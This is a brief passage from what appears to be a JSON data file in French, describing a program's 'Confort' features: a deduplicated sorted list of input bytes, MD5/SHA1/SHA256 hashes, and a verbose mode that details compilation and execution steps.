La liste class\u00e9e par ordre alphab\u00e9tique des octets qui le composent, sans doublons Les hashs MD5, SHA1 et SHA256 Lorsque l'option verbose est activ\u00e9e, le programme d\u00e9taille les processus de compilation et d'ex\u00e9cution pour permettre de les reproduire dans un autre contexte.","title":"Confort"}]}